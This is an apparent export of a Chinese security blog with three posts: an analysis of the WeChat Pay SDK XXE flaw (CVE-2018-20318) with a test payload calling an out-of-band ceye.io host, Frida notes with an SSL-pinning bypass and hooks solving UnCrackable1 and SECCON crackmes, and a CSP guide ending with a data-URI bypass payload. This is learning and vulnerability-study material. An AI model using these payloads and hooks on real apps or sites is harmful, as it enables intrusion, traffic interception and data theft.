        documentBuilderFactory.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);
        documentBuilderFactory.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);
        documentBuilderFactory.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false);
        documentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
        documentBuilderFactory.setXIncludeAware(false);
        documentBuilderFactory.setExpandEntityReferences(false);
</code></pre><p>详情分析 参考：</p>
<pre><code>http://xerces.apache.org/xerces2-j/features.html#external-general-entities
https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=23_5
</code></pre><h2 id="ex2"><a href="#ex2" class="headerlink" title="ex2"></a>ex2</h2><p>在简单分析了2018/07/03左右爆出来的微信SDK XXE漏洞函数后，可以回头来看一下CVE-2018-20318和CVE-2019-5312这两个CVE。</p>
<ul>
<li>CVE-2018-20318</li>
</ul>
<p>先看最开始的这个CVE：<br>根据issus 889</p>
<h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>已修复后漏洞代码如下：</p>
<pre><code>private Document getXmlDoc() {
    if (this.xmlDoc != null) {
      return this.xmlDoc;
        }

        try {
          this.xmlDoc = DocumentBuilderFactory
            .newInstance()
            .newDocumentBuilder()
          final DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
          factory.setExpandEntityReferences(false);
          this.xmlDoc = factory.newDocumentBuilder()
            .parse(new ByteArrayInputStream(this.xmlString.getBytes(StandardCharsets.UTF_8)));
          return xmlDoc;
        } catch (SAXException | IOException | ParserConfigurationException e) {
      throw new RuntimeException(&quot;非法的xml文本内容：&quot; + this.xmlString);
    }
  }

</code></pre><p>根据对比：<br>原漏洞代码：</p>
<pre><code>private Document getXmlDoc() {
    if (this.xmlDoc != null) {
      return this.xmlDoc;
        }

        try {
          this.xmlDoc = DocumentBuilderFactory
            .newInstance()
            .newDocumentBuilder()
            .parse(new ByteArrayInputStream(this.xmlString.getBytes(StandardCharsets.UTF_8)));
          return xmlDoc;
        } catch (SAXException | IOException | ParserConfigurationException e) {
      throw new RuntimeException(&quot;非法的xml文本内容：&quot; + this.xmlString);
    }
  }
</code></pre><p>这里可以明显看到，parse创建了解析器，但没有如上的对外部实体进行禁止</p>
<p>坑点：</p>
<p>在复现的时候，最好使用maven项目，用pom直接导入所需组件。这里需要补充一下</p>
<pre><code>    &lt;dependency&gt;
      &lt;groupId&gt;com.thoughtworks.xstream&lt;/groupId&gt;
      &lt;artifactId&gt;xstream&lt;/artifactId&gt;
      &lt;version&gt;1.4.7&lt;/version&gt;
    &lt;/dependency&gt;
</code></pre><p>测试payload：</p>
<pre><code>public void testToMap() throws Exception {
    WxPayOrderQueryResult result = new WxPayOrderQueryResult();
    result.setXmlString(&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;\n&quot; +
            &quot; \n&quot; +
            &quot;&lt;!DOCTYPE ANY [\n&quot; +
            &quot;&lt;!ENTITY test SYSTEM \&quot;http://th9bvw.ceye.io\&quot; &gt;]&gt;\n&quot; +
            &quot; \n&quot; +
            &quot;&lt;root&gt;&amp;test;&lt;/root&gt; &quot;);
    Map&lt;String, String&gt; map = result.toMap();
    System.out.println(map);

    //Assert.assertEquals(map.get(&quot;return_code&quot;), &quot;SUCCESS&quot;);
    //Assert.assertEquals(map.get(&quot;attach&quot;), &quot;订单额外描述&quot;);

  }
</code></pre><p>进行函数跟踪tomap到 BaseWxPayResult.java</p>
<pre><code>public Map&lt;String, String&gt; toMap() {
    if (StringUtils.isBlank(this.xmlString)) {
      throw new RuntimeException(&quot;xml数据有问题，请核实！&quot;);
    }

    Map&lt;String, String&gt; result = Maps.newHashMap();
    Document doc = this.getXmlDoc();

    try {
      NodeList list = (NodeList) XPathFactory.newInstance().newXPath()
        .compile(&quot;/xml/*&quot;)
        .evaluate(doc, XPathConstants.NODESET);
      int len = list.getLength();
      for (int i = 0; i &lt; len; i++) {
        result.put(list.item(i).getNodeName(), list.item(i).getTextContent());
      }
    } catch (XPathExpressionException e) {
      throw new RuntimeException(&quot;非法的xml文本内容：&quot; + xmlString);
    }

    return result;
  }
</code></pre><p>追溯到 getXmlDoc</p>
<p>可以在ceye上看到原漏洞导致的结果</p>
<h3 id="修复措施-1"><a href="#修复措施-1" class="headerlink" title="修复措施"></a>修复措施</h3><p>修改配置</p>
<pre><code>documentBuilderFactory.setExpandEntityReferences(false);
</code></pre><p>查看下详情</p>
<pre><code>public void setExpandEntityReferences(boolean expandEntityRef) {
        this.expandEntityRef = expandEntityRef;
    }
</code></pre><p>这个初始化设置为true</p>
<pre><code>  private boolean expandEntityRef = true;
</code></pre><p>但是这样修复的后果就是没有什么用，导致了CVE-2019-5312的问题<br>实际中可以参照ex1中的修复 </p>
<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ul>
<li>CVE-2019-5312<h2 id="ex3-–待补充"><a href="#ex3-–待补充" class="headerlink" title="ex3 –待补充"></a>ex3 –待补充</h2></li>
<li>实际渗透测试生活中遇到的xxe漏洞 <h3 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3></li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><pre><code>https://xz.aliyun.com/t/2427
https://mp.weixin.qq.com/s/xV7vtJmFL0FkPX05kiLNVw
https://github.com/Wechat-Group/WxJava/issues/889
https://github.com/Wechat-Group/WxJava/issues/903
https://blog.csdn.net/u013224189/article/details/80902339
</code></pre>]]></content>
      
        
        <tags>
            
            <tag> Web渗透 </tag>
            
            <tag> XXE 实例利用 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[frida理解与学习]]></title>
      <url>/2019/01/22/%E7%A7%BB%E5%8A%A8%E7%AB%AF/frida1/</url>
      <content type="html"><![CDATA[<p>【1】pip install frida</p>
<p>【2】sudo pip install frida-tools</p>
<p>【3】我这里使用的测试机cpuinfo是</p>
<pre><code>Processor    : ARMv7 Processor rev 0 (v7l)
</code></pre><p>所以下载的对应的server版本是frida-server-12.2.29-android-arm</p>
<p>在启动对应的sever后，可以不用端口转发直接测试链接 </p>
<p>frida-ps -U：在另一个终端的常规操作系统shell中检测frida中进程</p>
<p>frida-trace : 跟踪由对应应用使用的特定调用</p>
<p>如 跟踪chrome使用的open应用</p>
<pre><code>frida-trace -i &quot;open&quot; -U com.android.chrome
</code></pre><p>内心os（不知道特么是什么玄学问题，直接用的现目前最新版29，死活有问题，都快怀疑人生了，换了下24低版本，可以正常使用）</p>
<h3 id="测试功能"><a href="#测试功能" class="headerlink" title="测试功能"></a>测试功能</h3><h4 id="python-枚举android手机所有的进程"><a href="#python-枚举android手机所有的进程" class="headerlink" title="python 枚举android手机所有的进程"></a>python 枚举android手机所有的进程</h4><pre><code>import frida
rdev = frida.get_remote_device()
processes = rdev.enumerate_processes()
for process in processes:
    print (process)

</code></pre><h4 id="js-测试"><a href="#js-测试" class="headerlink" title="js 测试"></a>js 测试</h4><pre><code>setTimeout(function(){
  Java.perform(function(){
      console.log(&quot;hello world!&quot;);
    });
});

</code></pre><h4 id="frida-ssl-unpinning-待细看"><a href="#frida-ssl-unpinning-待细看" class="headerlink" title="frida ssl unpinning(待细看)"></a>frida ssl unpinning(待细看)</h4><pre><code>Java.perform(function() {                
    var array_list = Java.use(&quot;java.util.ArrayList&quot;);
    var ApiClient = Java.use(&#39;com.android.org.conscrypt.TrustManagerImpl&#39;);
    // console.log(&#39;Start ssl bypass.&#39;);

    ApiClient.checkTrustedRecursive.implementation = function(a1,a2,a3,a4,a5,a6) {
        console.log(&#39;Bypassing SSL Pinning&#39;);
        var k = array_list.$new(); 
        return k;
    }
},0);
</code></pre><p>在进行后面初学测试后，回头看 才发现这个并不是之前以为的通用版，是hook了com.android.org.conscrypt.TrustManagerImpl类的checkTrustedRecursive函数，猜测是作者在对应应用的校验函数。</p>
<h2 id="初学"><a href="#初学" class="headerlink" title="初学"></a>初学</h2><h3 id="功能模块"><a href="#功能模块" class="headerlink" title="功能模块"></a>功能模块</h3><h4 id="访问进程内存"><a href="#访问进程内存" class="headerlink" title="访问进程内存"></a>访问进程内存</h4><p>read_bytes(address, n)</p>
<p>write_bytes(address, data)</p>
<h5 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h5><ol>
<li>利用Frida从TeamViewer内存中提取密码（暂未复现）</li>
</ol>
<h4 id="在应用程序运行时覆盖函数"><a href="#在应用程序运行时覆盖函数" class="headerlink" title="在应用程序运行时覆盖函数"></a>在应用程序运行时覆盖函数</h4><p>implementation 覆盖了原函数，进行重执行</p>
<h4 id="从导入的类调用函数"><a href="#从导入的类调用函数" class="headerlink" title="从导入的类调用函数"></a>从导入的类调用函数</h4><p>这个也是默认的功能，可以直接调用java.use的导入需求的类，然后通过 this.a 调用原函数，调用情况在下面例子中有。</p>
<p>当需要打印成员数据时，可以调用.value属性来访问</p>
<pre><code>var ah = Java.use(&quot;com/miui/virtualsim/utils/ah&quot;);
console.log(&quot;To Log: &quot; + ah.a.value);
ah.a.value = true; 
</code></pre><h4 id="在堆上查找对象实例并使用他们"><a href="#在堆上查找对象实例并使用他们" class="headerlink" title="在堆上查找对象实例并使用他们"></a>在堆上查找对象实例并使用他们</h4><h4 id="Hook、追踪和拦截函数"><a href="#Hook、追踪和拦截函数" class="headerlink" title="Hook、追踪和拦截函数"></a>Hook、追踪和拦截函数</h4><pre><code>https://blog.csdn.net/u011337769/article/details/82855818
https://www.52pojie.cn/thread-848126-1-1.html
https://blog.csdn.net/qingemengyue/article/details/79871926
</code></pre><h4 id="crack-学习"><a href="#crack-学习" class="headerlink" title="crack 学习"></a>crack 学习</h4><h5 id="ex1"><a href="#ex1" class="headerlink" title="ex1"></a>ex1</h5><p>因为不知道的什么原因，我这里的frida在使用-f（spawn）的时候就会报错，not connection，所以不能spwan模式在重启程序时调试。只能着眼于已进入mainActivity程序后续进行hook </p>
<h6 id="如何修改Java层的函数参数和返回值"><a href="#如何修改Java层的函数参数和返回值" class="headerlink" title="如何修改Java层的函数参数和返回值"></a>如何修改Java层的函数参数和返回值</h6><ul>
<li>apk解析 首先找mainActivity中的oncreate方法，这个是在activity创建时即执行的方法</li>
</ul>
<ol>
<li>mainActivity<br><code>`</code><br>package sg.vantagepoint.uncrackable1;</li>
</ol>
<p>import android.app.Activity;<br>import android.app.AlertDialog;<br>import android.app.AlertDialog.Builder;<br>import android.os.Bundle;<br>import android.view.View;<br>import android.widget.EditText;<br>import sg.vantagepoint.a.b;<br>import sg.vantagepoint.a.c;</p>
<p>public class MainActivity extends Activity {<br>    private void a(String str) {<br>        AlertDialog create = new Builder(this).create();<br>        create.setTitle(str);<br>        create.setMessage(“This in unacceptable. The app is now going to exit.”);<br>        create.setButton(-3, “OK”, new b(this));<br>        create.setCancelable(false);<br>        create.show();<br>    }</p>
<pre><code>protected void onCreate(Bundle bundle) {
    if (c.a() || c.b() || c.c()) {
        a(&quot;Root detected!&quot;);
    }
    if (b.a(getApplicationContext())) {
        a(&quot;App is debuggable!&quot;);
    }
    super.onCreate(bundle);
    setContentView(R.layout.activity_main);
}

public void verify(View view) {
    String obj = ((EditText) findViewById(R.id.edit_text)).getText().toString();
    AlertDialog create = new Builder(this).create();
    if (a.a(obj)) {
        create.setTitle(&quot;Success!&quot;);
        create.setMessage(&quot;This is the correct secret.&quot;);
    } else {
        create.setTitle(&quot;Nope...&quot;);
        create.setMessage(&quot;That&#39;s not it. Try again.&quot;);
    }
    create.setButton(-3, &quot;OK&quot;, new c(this));
    create.show();
}
</code></pre><p>}</p>
<pre><code>在该apk调用中，在mainAc中onCreate- create.setButton(-3, &quot;OK&quot;, new b(this));
2. b类
</code></pre><p>package sg.vantagepoint.uncrackable1;</p>
<p>import android.content.DialogInterface;<br>import android.content.DialogInterface.OnClickListener;</p>
<p>class b implements OnClickListener {<br>    final /<em> synthetic </em>/ MainActivity a;</p>
<pre><code>b(MainActivity mainActivity) {
    this.a = mainActivity;
}

public void onClick(DialogInterface dialogInterface, int i) {
    System.exit(0);
}
</code></pre><p>}</p>
<pre><code>调用后退出应用。

- 注入js解析
</code></pre><p>setImmediate(function() { //prevent timeout<br>    console.log(“[*] Starting script”);</p>
<pre><code>Java.perform(function() {

  bClass = Java.use(&quot;sg.vantagepoint.uncrackable1.b&quot;);
  bClass.onClick.implementation = function(v) {
     console.log(&quot;[*] onClick called&quot;);
  }
  console.log(&quot;[*] onClick handler modified&quot;)

})
</code></pre><p>})</p>
<pre><code>1. 在该js中 Java.perform相当于main函数；获取sg.vantagepoint.uncrackable1.b 类，然后调用onclick模拟点击事件,让本该退出的成为 调用后输出console.log
修改：
</code></pre><p>setImmediate(function() { //prevent timeout<br>    console.log(“[*] Starting script”);</p>
<pre><code>Java.perform(function() {

  bClass = Java.use(&quot;sg.vantagepoint.uncrackable1.b&quot;);
  aClass = Java.use(&quot;sg.vantagepoint.uncrackable1.c&quot;);
  bClass.onClick.implementation = function(v) {
     console.log(&quot;[*] onClick called bb&quot;);
  }
  aClass.onClick.implementation = function(v) {
     console.log(&quot;[*] onClick called aa&quot;);
  }
  console.log(&quot;[*] onClick handler modified&quot;)

})
</code></pre><p>})</p>
<pre><code>2. 在该apk中，调用原aes加密函数 sg.vantagepoint.a.a函数，进行解密，将结果输出。
</code></pre><p>setImmediate(function() { //prevent timeout<br>    console.log(“[*] Starting script”);</p>
<pre><code>Java.perform(function() {

  bClass = Java.use(&quot;sg.vantagepoint.uncrackable1.b&quot;);
  bClass.onClick.implementation = function(v) {
     console.log(&quot;[*] onClick called&quot;);
  }
  aaclass = Java.use(&quot;sg.vantagepoint.a.a&quot;);
  aaclass.a.implementation = function (arg1, arg2) {
   pass = &quot;&quot;;
   s = this.a(arg1, arg2); 
   for(i=0; i&lt;s.length; i++) {
              pass += String.fromCharCode(s[i]);
          }
          console.log(&quot;[*] content: &quot; + pass);
</code></pre><p>return s;}<br>      console.log(“[*] onClick handler modified”)</p>
<pre><code>})
</code></pre><p>})</p>
<pre><code>3. 在该apk中，hook输出最后的校验函数 sg.vantagepoint.uncrackable1.a.a函数结果，使其一直返回true
</code></pre><p>setImmediate(function() { //prevent timeout<br>    console.log(“[*] Starting script”);</p>
<pre><code>Java.perform(function() {

  bClass = Java.use(&quot;sg.vantagepoint.uncrackable1.b&quot;);
  bClass.onClick.implementation = function(v) {
     console.log(&quot;[*] onClick called&quot;);
  }
  aaclass = Java.use(&quot;sg.vantagepoint.uncrackable1.a&quot;);
  aaclass.a.implementation = function (arg1) {

  return true;
}
  console.log(&quot;[*] onClick handler modified&quot;)

})
</code></pre><p>})</p>
<pre><code>##### ex2
场景参考在这里：
https://bbs.pediy.com/thread-227232.htm

###### 源码分析
同上先看oncreate函数
</code></pre><p>protected void onCreate(Bundle savedInstanceState) {<br>        super.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>        this.P = (Button) findViewById(R.id.button);<br>        this.S = (Button) findViewById(R.id.button3);<br>        this.r = (Button) findViewById(R.id.buttonR);<br>        this.P.setOnClickListener(this);<br>        this.r.setOnClickListener(this);<br>        this.S.setOnClickListener(this);<br>        this.flag = 0;<br>    }</p>
<pre><code>菜鸟学android什么都的查emmmmm

**Bundle savedInstanceState：**
经常会出现用户按到home键，退出了界面，或者安卓系统意外回收了应用的进程，这种情况下，使用Bundle savedInstanceState就可以用户再次打开应用的时候恢复的原来的状态，剩下的声明了button控件和事件的监听

onClick函数
</code></pre><p> public void onClick(View v) {<br>        if (this.flag != 1) {<br>            this.flag = 1;<br>            ((TextView) findViewById(R.id.textView3)).setText(“”);<br>            TextView tv = (TextView) findViewById(R.id.textView);<br>            TextView tv2 = (TextView) findViewById(R.id.textView2);<br>            this.m = 0;<br>            this.n = new Random().nextInt(3);<br>            tv2.setText(new String[]{“CPU: Paper”, “CPU: Rock”, “CPU: Scissors”}[this.n]);<br>            if (v == this.P) {<br>                tv.setText(“YOU: Paper”);<br>                this.m = 0;<br>            }<br>            if (v == this.r) {<br>                tv.setText(“YOU: Rock”);<br>                this.m = 1;<br>            }<br>            if (v == this.S) {<br>                tv.setText(“YOU: Scissors”);<br>                this.m = 2;<br>            }<br>            this.handler.postDelayed(this.showMessageTask, 1000);<br>        }<br>    }</p>
<pre><code>postDelayed：创建多线程消息的函数，类似于定时器，每秒触发一下this.showMessageTask
</code></pre><p>private final Runnable showMessageTask = new Runnable() {<br>        public void run() {<br>            TextView tv3 = (TextView) MainActivity.this.findViewById(R.id.textView3);<br>            MainActivity mainActivity;<br>            if (MainActivity.this.n - MainActivity.this.m == 1) {<br>                mainActivity = MainActivity.this;<br>                mainActivity.cnt++;<br>                tv3.setText(“WIN! +” + String.valueOf(MainActivity.this.cnt));<br>            } else if (MainActivity.this.m - MainActivity.this.n == 1) {<br>                MainActivity.this.cnt = 0;<br>                tv3.setText(“LOSE +0”);<br>            } else if (MainActivity.this.m == MainActivity.this.n) {<br>                tv3.setText(“DRAW +” + String.valueOf(MainActivity.this.cnt));<br>            } else if (MainActivity.this.m &lt; MainActivity.this.n) {<br>                MainActivity.this.cnt = 0;<br>                tv3.setText(“LOSE +0”);<br>            } else {<br>                mainActivity = MainActivity.this;<br>                mainActivity.cnt++;<br>                tv3.setText(“WIN! +” + String.valueOf(MainActivity.this.cnt));<br>            }<br>            if (1000 == MainActivity.this.cnt) {<br>                tv3.setText(“SECCON{“ + String.valueOf((MainActivity.this.cnt + MainActivity.this.calc()) * 107) + “}”);<br>            }<br>            MainActivity.this.flag = 0;<br>        }<br>    };</p>
<pre><code>根据例子一以及源码分析，该问题需要hook com.example.seccon2015.rock_paper.scissors.MainActivity中的showMessageTask函数,使其直接执行
</code></pre><p> if (1000 == MainActivity.this.cnt) {<br>                tv3.setText(“SECCON{“ + String.valueOf((MainActivity.this.cnt + MainActivity.this.calc()) * 107) + “}”);<br>            }</p>
<pre><code>
构造js如下，hook掉对应的onclick函数-1：
</code></pre><p>setImmediate(function() { //prevent timeout<br>    console.log(“[*] Starting script”);<br>    Java.perform(function () {</p>
<pre><code>var mClass = Java.use(&#39;com.example.seccon2015.rock_paper_scissors.MainActivity&#39;);
mClass.onClick.implementation = function () {
    console.log(&quot;Hook Start...&quot;);
    console.log(&quot;SECCON{&quot; + (1000 + this.calc())*107 + &quot;}&quot;)

    }
})
</code></pre><p>});</p>
<pre><code>构造js如下，hook掉对应的onclick函数-2：

</code></pre><p>setImmediate(function() { //prevent timeout<br>    console.log(“[<em>] Starting script”);<br>    Java.perform(function () {<br>//定义变量MainActivity，Java.use指定要使用的类<br>    var MainActivity = Java.use(‘com.example.seccon2015.rock_paper_scissors.MainActivity’);<br>    //hook该类下的onCreate方法，重新实现它<br>    MainActivity.onClick.implementation = function () {<br>        send(“Hook Start…”);<br>        //调用calc()方法，获取返回值<br>        var returnValue = this.calc();<br>        send(“Return:”+returnValue);<br>        var result = (1000+returnValue)</em>107;<br>        //解出答案<br>        send(“Flag:”+”SECCON{“+result.toString()+”}”);<br>        }<br>    })<br>});</p>
<pre><code>

##### 如何打印Java层的方法堆栈信息
枚举内存范围 enumerate_ranges(mask)
##### 如何拦截native层的函数参数和返回值



#### 需要理解的问题

##### java反射

##### 动态代码插桩DBI


#### 参考
</code></pre><p><a href="https://www.52pojie.cn/thread-848126-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-848126-1-1.html</a><br><a href="https://blog.csdn.net/omnispace/article/details/70598829" target="_blank" rel="noopener">https://blog.csdn.net/omnispace/article/details/70598829</a><br><a href="https://codemetrix.net/hacking-android-apps-with-frida-2/" target="_blank" rel="noopener">https://codemetrix.net/hacking-android-apps-with-frida-2/</a><br><a href="https://www.frida.re/docs/javascript-api/#java" target="_blank" rel="noopener">https://www.frida.re/docs/javascript-api/#java</a><br><a href="https://github.com/iromise/AOS-Note/blob/42544f4635e6238e2d7ddbc6e4e1789c20d2c130/frida-exp/frida.md" target="_blank" rel="noopener">https://github.com/iromise/AOS-Note/blob/42544f4635e6238e2d7ddbc6e4e1789c20d2c130/frida-exp/frida.md</a><br><a href="https://bbs.pediy.com/thread-227232.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-227232.htm</a><br><a href="https://www.cnblogs.com/qwangxiao/p/9255328.html" target="_blank" rel="noopener">https://www.cnblogs.com/qwangxiao/p/9255328.html</a><br><code>`</code></p>
]]></content>
      
        
        <tags>
            
            <tag> 移动端 </tag>
            
            <tag> frida </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[安全策略-csp理解与学习]]></title>
      <url>/2019/01/10/%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5/csp/</url>
      <content type="html"><![CDATA[<h1 id="内容安全策略-CSP"><a href="#内容安全策略-CSP" class="headerlink" title="内容安全策略 CSP"></a>内容安全策略 CSP</h1><p>百度百科概念： </p>
<p>CSP指的是内容安全策略，为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。这将引入一些相当严格的策略，会使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容</p>
<p>直白的说就是通过该浏览器扩展 进行 加载资源脚本的黑白名单限制；实现和执行均由浏览器完成</p>
<h4 id="功能效果"><a href="#功能效果" class="headerlink" title="功能效果"></a>功能效果</h4><p>主要用来防注入脚本（比如 xss 加载其他域下的js；广告注入h5页面、运营商的http劫持）图片、iframe、fton、style等等可能的远程的资源</p>
<ul>
<li>限制远程资源的请求，如通过远程请求将资源如cookie传送出去</li>
<li>记录违规的限制行为，并汇报给指定目标。</li>
</ul>
<h5 id="CSP和同源策略"><a href="#CSP和同源策略" class="headerlink" title="CSP和同源策略"></a>CSP和同源策略</h5><p>在同源策略中 一个页面的资源只能从与之同源的服务器获取，不能从其他域获取；但因此也影响了灵活性，CSP相对来说 可以跨域获取资源，又能防止恶意代码。</p>
<h5 id="使用方式："><a href="#使用方式：" class="headerlink" title="使用方式："></a>使用方式：</h5><h6 id="要素"><a href="#要素" class="headerlink" title="要素"></a>要素</h6><p>CSP域：允许使用CSP的规则</p>
<p>CSP指令集：允许白名单的内容规则</p>
<pre><code>示例

default-src &#39;self&#39;;   

只允许同源下的资源



script-src &#39;self&#39;;     

只允许同源下的js



script-src &#39;self&#39; www.google-analytics.com ajax.googleapis.com;

允许同源以及两个地址下的js加载



default-src &#39;none&#39;; script-src &#39;self&#39;; connect-src &#39;self&#39;; img-src &#39;self&#39;; style-src &#39;self&#39;;

多个资源时,后面的会覆盖前面的
</code></pre><ul>
<li>常见csp策略</li>
</ul>
<table>
<thead>
<tr>
<th>指令</th>
<th>指令和指令值示例</th>
<th>指令说明 </th>
</tr>
</thead>
<tbody>
<tr>
<td>default-src</td>
<td>‘self’ cdn.guangzhul.com</td>
<td>默认加载策略</td>
</tr>
<tr>
<td>script-src</td>
<td>‘self’ js.guangzhul.com</td>
<td>对 JavaScript 的加载策略。</td>
</tr>
<tr>
<td>style-src</td>
<td>‘self’ css.guangzhul.com</td>
<td>对样式的加载策略。</td>
</tr>
<tr>
<td>img-src</td>
<td>‘self’ img.guangzhul.com</td>
<td>对图片的加载策略。</td>
</tr>
<tr>
<td>connect-src</td>
<td>‘self’</td>
<td>对 Ajax、WebSocket 等请求的加载策略。不允许的情况下，浏览器会模拟一个状态为 400 的响应。</td>
</tr>
<tr>
<td>font-src</td>
<td>font.cdn.guangzhul.com</td>
<td>针对 WebFont 的加载策略。</td>
</tr>
<tr>
<td>object-src</td>
<td>‘self’</td>
<td>针对 、 或 等标签引入的 flash 等插件的加载策略。</td>
</tr>
<tr>
<td>media-src</td>
<td>media.cdn.guangzhul.com</td>
<td>针对媒体引入的 HTML 多媒体的加载策略。</td>
</tr>
<tr>
<td>frame-src</td>
<td>‘self’</td>
<td>针对 frame 的加载策略。</td>
</tr>
<tr>
<td>report-uri</td>
<td>/report-uri</td>
<td>告诉浏览器如果请求的资源不被策略允许时，往哪个地址提交日志信息。 特别的：如果想让浏览器只汇报日志，不阻止任何内容，可以改用 Content-Security-Policy-Report-Only 头。</td>
</tr>
</tbody>
</table>
<ul>
<li>其他CSP指令</li>
</ul>
<table>
<thead>
<tr>
<th>指令</th>
<th>指令和指令值示例</th>
<th>指令说明 </th>
</tr>
</thead>
<tbody>
<tr>
<td>sandbox</td>
<td></td>
<td>设置沙盒环境</td>
</tr>
<tr>
<td>child-src</td>
<td></td>
<td>主要防御 <frame>,<iframe></iframe></td>
</tr>
<tr>
<td>form-action</td>
<td></td>
<td>主要防御 <form></form></td>
</tr>
<tr>
<td>frame-ancestors</td>
<td></td>
<td>主要防御 <frame>,<iframe>,<object>,<embed>,<applet></applet></object></iframe></td>
</tr>
<tr>
<td>plugin-types</td>
<td></td>
<td>主要防御 <object>,<embed>,<applet></applet></object></td>
</tr>
</tbody>
</table>
<ul>
<li>常见指令值</li>
</ul>
<table>
<thead>
<tr>
<th>指令值</th>
<th>指令和指令值示例</th>
<th>指令值说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>*</td>
<td>img-src *</td>
<td>允许任何内容。</td>
</tr>
<tr>
<td>‘none’</td>
<td>img-src ‘none’</td>
<td>不允许任何内容。</td>
</tr>
<tr>
<td>‘self’</td>
<td>img-src ‘self’</td>
<td>允许来自相同来源的内容（相同的协议、域名和端口）。</td>
</tr>
<tr>
<td>data:</td>
<td>img-src data:</td>
<td>允许 data: 协议（如 base64 编码的图片）。</td>
</tr>
<tr>
<td><a href="http://www.guangzhul.com" target="_blank" rel="noopener">www.guangzhul.com</a></td>
<td>img-src</td>
<td>img.guangzhul.com    允许加载指定域名的资源。</td>
</tr>
<tr>
<td>*.guangzhul.com</td>
<td>img-src *.guangzhul.com    允许加载 guangzhul.com</td>
<td>任何子域的资源。</td>
</tr>
<tr>
<td>‘unsafe-inline’</td>
<td>script-src ‘unsafe-inline’</td>
<td>允许加载 inline 资源（例如常见的 style 属性，onclick，inline js 和 inline css 等等）。</td>
</tr>
<tr>
<td>‘unsafe-eval’</td>
<td>script-src ‘unsafe-eval’</td>
<td>允许加载动态 js 代码，例如 eval()。</td>
</tr>
</tbody>
</table>
<pre><code>限制所有的外部资源，都只能从当前域名加载
Content-Security-Policy: default-src &#39;self&#39; 
</code></pre><p>可以由http header和html来指定,启用后，不符合 CSP 的外部资源就会被阻止加载。</p>
<h5 id="http-header"><a href="#http-header" class="headerlink" title="http header"></a>http header</h5><p>在服务端的响应包的header中展示 内容均来自于应用自己域，不涉及子域</p>
<pre><code>Content-Security-Policy:default-src&#39;self&#39;
</code></pre><h5 id="html中通过meta来限制"><a href="#html中通过meta来限制" class="headerlink" title="html中通过meta来限制"></a>html中通过meta来限制</h5><pre><code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#39;self&#39;; object-src &#39;none&#39;; style-src cdn.example.org third-party.org; child-src https:&quot;&gt;
</code></pre><h4 id="构建一下csp-来个例子"><a href="#构建一下csp-来个例子" class="headerlink" title="构建一下csp 来个例子"></a>构建一下csp 来个例子</h4><h5 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h5><p>首先要在配置文件中加载mod_headers.so模块，</p>
<pre><code>sudo  a2enmod headers
</code></pre><p>在对应的配置文件中，我用的apache2.conf进行配置</p>
<pre><code>LoadModule headers_module modules/mod_headers.so
</code></pre><p>然后可以添加相关规则</p>
<pre><code>Header set Content-Security-Policy &quot;default-src &#39;self&#39;;&quot;
</code></pre><h5 id="常见绕过方式"><a href="#常见绕过方式" class="headerlink" title="常见绕过方式"></a>常见绕过方式</h5><h6 id="1-文件上传绕过-只允许加载当前域"><a href="#1-文件上传绕过-只允许加载当前域" class="headerlink" title="1 文件上传绕过  只允许加载当前域"></a>1 文件上传绕过  只允许加载当前域</h6><p>最常见规则如下：</p>
<pre><code>header(&quot;Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39; &quot;); 
</code></pre><p>针对这种方式，通常使用方法是 找一个文件上传点，上传一个文件内容为js的图片<br>说到这里 注意一下，浏览器对一个文件做解析/下载 处理的,并不是文件的后缀名<br>而是服务器返回的mimeType,如果在服务端没有定义的类型，即通俗的mimes.type中没有定义，即没有返回content-type<br>则在apache服务器中会默认以html格式解析（在nginx服务器中会以octet-stream，直接下载，这里可以使用svg后缀触发svg标签。条件允许的话），所以在遇到上传黑名单的时候，可以试试xx类似的。</p>
<p>测试过程中 一来就折戟沉沙，头大，使用 该规则后，简单测试 xx文件后缀，直接嵌入script标签，</p>
<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
</code></pre><p>竟然没用，一顿瞎操作后才确定，是因为制定了csp规则的问题。</p>
<pre><code>script-src &#39;self&#39;; 或者 default-src &#39;self&#39;
</code></pre><p>要允许内联的js执行，即添加 “unsafe-inline”</p>
<ul>
<li>不允许内联时 测试的时候直接alert是没法触发的，所以在常规渗透测试的时候要注意，这个时候用 script src 这类引用是可以的，引用上传的同域js 执行。</li>
</ul>
<p>使用下列js伪协议的payload可以绕过safari（ 12.0.2 ）的csp检测，chrome和firefox不行，猜测可能跟csp检测顺序阶段有关（待深入讨论）。</p>
<pre><code>&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;

